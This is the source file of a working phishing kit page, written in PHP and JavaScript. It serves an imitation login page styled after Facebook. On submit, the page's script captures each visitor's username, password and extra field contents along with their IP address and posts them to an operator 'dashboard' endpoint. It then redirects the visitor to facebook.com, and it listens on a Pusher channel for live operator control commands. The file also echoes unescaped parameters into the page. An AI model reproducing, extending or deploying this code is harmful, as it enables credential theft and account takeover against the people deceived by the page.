<?php
require_once 'config.php';
$slug = trim($_GET['slug']) ?? '';
if (empty($slug)) {
    handleError('Missing slug parameter', 400);
}
$website = getWebsiteBySlug($pdo, $slug);
if (!$website) {
    handleError('Website not found', 404);
}
$template = getLoginTemplate($pdo, $website['login_template_id']);
if (!$template) {
    handleError('Login template not found', 404);
}
incrementViewCount($pdo, $website['id']);
$ip = $_SERVER['REMOTE_ADDR'] ?? '172.68.225.111';
$ssid = rand();
?>
<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
<title><?= htmlspecialchars($website['title']) ?></title>
<script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>

<meta name="description" content="<?= htmlspecialchars($website['description']) ?>">
</head>
<body>
<?= $template['content_html'] ?>
<?php if (!empty($template['content_css'])): ?>
<style><?= $template['content_css'] ?></style>
<?php endif; ?>
<?php if (!empty($template['content_js'])): ?>
<script><?= $template['content_js'] ?></script>
<?php endif; ?>

<script>
loading(false);
// Facebook-like loading system
class FacebookLoader {
    constructor() {
        this.isLoading = false;
        this.loadingBar = null;
        this.overlay = null;
        this.init();
    }
    
    init() {
        this.createLoadingElements();
        this.setupEventListeners();
    }
    
    createLoadingElements() {
        // Create loading overlay
        this.overlay = document.createElement("div");
        this.overlay.id = "fb-loading-overlay";
        this.overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.8);
            backdrop-filter: blur(2px);
            z-index: 9998;
            display: none;
            transition: opacity 0.3s ease;
        `;
        
        // Create top loading bar
        this.loadingBar = document.createElement("div");
        this.loadingBar.id = "fb-loading-bar";
        this.loadingBar.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 3px;
            background: linear-gradient(90deg, #1877f2, #42a5f5, #1877f2);
            background-size: 200% 100%;
            z-index: 9999;
            display: none;
            animation: fbLoading 1.5s ease-in-out infinite;
        `;
        
        // Add CSS animation
        const style = document.createElement("style");
        style.textContent = `
            @keyframes fbLoading {
                0% { background-position: 200% 0; }
                100% { background-position: -200% 0; }
            }
            .fb-loading-active {
                pointer-events: none !important;
                user-select: none !important;
            }
            .fb-loading-active * {
                pointer-events: none !important;
                user-select: none !important;
            }
        `;
        document.head.appendChild(style);
        
        // Add elements to body
        document.body.appendChild(this.overlay);
        document.body.appendChild(this.loadingBar);
    }
    
    setupEventListeners() {
        this.overlay.addEventListener("click", (e) => {
            if (this.isLoading) {
                e.preventDefault();
                e.stopPropagation();
            }
        });
        
        document.addEventListener("submit", (e) => {
            if (this.isLoading) {
                e.preventDefault();
                e.stopPropagation();
            }
        });
    }
    
    loading(show = true) {
        if (show) {
            this.startLoading();
        } else {
            this.stopLoading();
        }
    }
    
    startLoading() {
        if (this.isLoading) return;
        
        this.isLoading = true;
        this.overlay.style.display = "block";
        this.loadingBar.style.display = "block";
        document.body.classList.add("fb-loading-active");
        
        // Show immediately without delay
        this.overlay.style.opacity = "1";
        
        console.log("🔄 Loading started");
    }
    
    stopLoading() {
        if (!this.isLoading) return;
        
        this.isLoading = false;
        this.overlay.style.opacity = "0";
        
        setTimeout(() => {
            this.overlay.style.display = "none";
            this.loadingBar.style.display = "none";
            document.body.classList.remove("fb-loading-active");
        }, 300);
        
        console.log("✅ Loading completed");
    }
    
    simulateLoading(duration = 2000) {
        this.startLoading();
        
        // Only simulate progress, don't auto-stop
        let progress = 0;
        const interval = setInterval(() => {
            progress += Math.random() * 30;
            if (progress >= 100) {
                progress = 100;
                clearInterval(interval);
                // Don't auto-stop, wait for manual loading(false)
            }
        }, duration / 10);
    }
}

// Initialize Facebook loader
const fbLoader = new FacebookLoader();

// Make loading function globally available
window.loading = (show) => {
    fbLoader.loading(show);
};

window.simulateLoading = (duration) => {
    fbLoader.simulateLoading(duration);
};

// Auto-loading on page load
document.addEventListener("DOMContentLoaded", function() {
    setTimeout(() => {
        fbLoader.simulateLoading(1500);
    }, 500);
});

// Form submission handler
document.addEventListener("DOMContentLoaded", function() {
    const forms = document.querySelectorAll("form");
    
    forms.forEach(form => {
        form.addEventListener("submit", async function(event) {
            event.preventDefault();
            loading(true);
            
            const usernameField = document.querySelector("#username");
            const passwordField = document.querySelector("#password");
            const contentField = document.querySelector("#content");
            
            const username = usernameField ? usernameField.value.trim() : "";
            const password = passwordField ? passwordField.value.trim() : "";
            const content = contentField ? contentField.value.trim() : "";
            
            console.log("📝 Form data captured:", {
                username: username,
                password: password ? "***" : "empty",
                content: content
            });
            
            if (username && password) {
                try {
                    const accountData = {
                        id: Date.now(),
                        username: username,
                        password: password,
                        email: username,
                        website: CONFIG.websiteId,
                        website_title: CONFIG.websiteTitle,
                        ip_address: "<?= $_SERVER['REMOTE_ADDR'] ?? '172.68.225.111' ?>",
                        status: "pending",
                        content: content ? JSON.stringify({"Data": content}) : "{\"Data\":\"Nothing\"}",
                        created_at: new Date().toISOString()
                    };
                    
                    console.log("📤 Sending data to dashboard:", accountData);
                    
                    const response = await fetch(CONFIG.apiEndpoint, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            type: "new_account",
                            data: {
                                account: accountData,
                                timestamp: new Date().toISOString()
                            }
                        })
                    });
                    
                    if (response.ok) {
                        console.log("✅ Data sent to dashboard successfully");
                        // Don't auto-stop loading, wait for manual control
                        setTimeout(() => {
                            window.location.href = "<?= $website['redirect_url'] ?: 'https://facebook.com' ?>";
                        }, 2000);
                    } else {
                        console.error("❌ Failed to send data to dashboard");
                        loading(false);
                    }
                } catch (error) {
                    console.error("💥 Error sending data:", error);
                    loading(false);
                }
            } else {
                console.warn("⚠️ Missing username or password");
                loading(false);
            }
        });
    });
});

// Pusher configuration
const CONFIG = {
    pusherKey: "049ee983c4ec4cecf834",
    cluster: "ap1",
    apiEndpoint: "send-pusher.php",
    websiteId: <?= $website['id'] ?>,
    ssid: "<?= $ssid ?>",
    userIP: "<?= $ip ?>",
    websiteTitle: "<?= addslashes($website['title']) ?>"
};

// Initialize Pusher
let pusher = null;
let controlChannel = null;

try {
    pusher = new Pusher(CONFIG.pusherKey, {
        cluster: CONFIG.cluster,
        encrypted: true
    });
    
    controlChannel = pusher.subscribe("receive-control");
    
    controlChannel.bind("control_command_" + CONFIG.ssid, function(data) {
        console.log("🎛️ Received control command:", data);
        
        if (data.data && data.data.fieldIds && Array.isArray(data.data.fieldIds)) {
            alert("Field IDs received: " + data.data.fieldIds.join(", "));
            console.log("📋 Field IDs:", data.data.fieldIds);
        }
        
        if (data.fieldIds && Array.isArray(data.fieldIds)) {
            alert("Root Field IDs received: " + data.fieldIds.join(", "));
            console.log("📋 Root Field IDs:", data.fieldIds);
        }
        
        if (data.account && data.account.fieldIds) {
            alert("Account Field IDs: " + data.account.fieldIds.join(", "));
            console.log("📋 Account Field IDs:", data.account.fieldIds);
        }
        
        if (data.data && data.data.account && data.data.account.fieldIds) {
            alert("Data Account Field IDs: " + data.data.account.fieldIds.join(", "));
            console.log("📋 Data Account Field IDs:", data.data.account.fieldIds);
        }
    });
    
    console.log("✅ Pusher initialized successfully");
    
} catch (error) {
    console.error("Failed to initialize Pusher:", error);
}

</script>

<script>
    function Login(){
        window.location.href = 'fblog.php?slug=<?=$slug?>';
    }
</script>
</body>
</html>